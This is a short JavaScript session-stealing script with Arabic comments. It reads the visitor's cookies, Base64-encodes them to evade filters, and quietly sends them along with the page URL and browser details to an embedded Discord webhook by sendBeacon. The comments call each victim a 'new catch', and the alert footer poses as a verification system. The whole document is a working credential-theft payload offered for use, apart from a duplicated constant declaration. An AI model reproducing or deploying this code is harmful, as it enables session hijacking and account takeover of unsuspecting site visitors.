// سكريبت سحب الجلسة المطور - إصدار 2026
(function() {
    // 1. رابط الاستقبال (الديسكورد الخاص بك)
    // تأكد من وضع الفاصلة المنقوطة (😉 في النهاية بدقة
    const WEBHOOK_URL = "ضع_رابط_الويب_هوك_الخاص_بك_هنا";
const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1472707165205565541/E5L4CtND22HNN01AgMscC-HfN6pS7RPl5Xm6rvQ_vrBl_HAC0r84dZpjeKHN_fSfdcL4";
    // 2. تجميع البيانات وتشفيرها بصيغة Base64 للتمويه
    const data = {
        t: "🚨 صيد جديد!",
        c: btoa(document.cookie), // تشفير الكوكيز لضمان العبور من الفلاتر
        u: window.location.href,
        a: navigator.userAgent
    };

    // 3. إرسال البيانات عبر تقنية Beacon (الأسرع والأكثر خفاءً)
    const blob = new Blob([JSON.stringify({
        "embeds": [{
            "title": data.t,
            "color": 16711680,
            "fields": [
                { "name": "الموقع المستهدف", "value": data.u },
                { "name": "الجلسة (Cookies)", "value": "```" + data.c + "```" },
                { "name": "معلومات الجهاز", "value": data.a }
            ],
            "footer": { "text": "تم السحب بنجاح عبر نظام التحقق" }
        }]
    })], { type: 'application/json' });

    navigator.sendBeacon(WEBHOOK_URL, blob);
})();
